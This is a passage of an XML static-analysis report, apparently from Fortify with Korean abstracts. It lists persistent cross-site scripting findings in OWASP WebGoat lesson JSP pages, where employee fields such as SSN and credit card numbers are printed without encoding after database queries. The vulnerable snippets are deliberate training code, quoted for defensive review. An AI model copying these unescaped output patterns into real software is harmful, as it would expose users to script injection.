                        <Issue iid="045E5EAF2866C8E90562D4EE7584A863" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="78DD617BC21EB1F2FA1EF0F9889CFB5E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B6F089790BA78EEE9E4020FB62610F5F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E92960C81564C4E400E6091AEFFF6444" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="05A0F6AFD474BE5889D5E6D4EE48172F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6FCEEFD8CBD4A1F82F512A18B8AB76A6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="818FAAF104A3647CFA3D3BCFE0B56B3F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A6D56F666BF942442818A66CC25EC66F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9DAA7216019D877C39972070429E2466" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CBC5FE8A471604355816C2A890636FF4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="276917A248A48782C942B89F9E07FF8A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C56DDC938BBCEDBEB33D18F36303A56C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BA437B56E50D8DDD8A83CCF2FEAF6AFA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5B1385A593BF9C250315911DCEA8B395" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="257A49F3D3663074640B6D0C079F8FD2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EE408CCA21816AC460D4BF8FD6393E79" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4258F00CFFAF1674272EE409BE6D2481" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0DC4D3786B8D7FB07CE6D0D048D3E70D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DD09DA27F2E58F46558E32858D4D22FE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4B4B803548CF2D8A06F9A8391AD5B93" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6DE59F10E9BDBE7F05E11A84EA04176E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
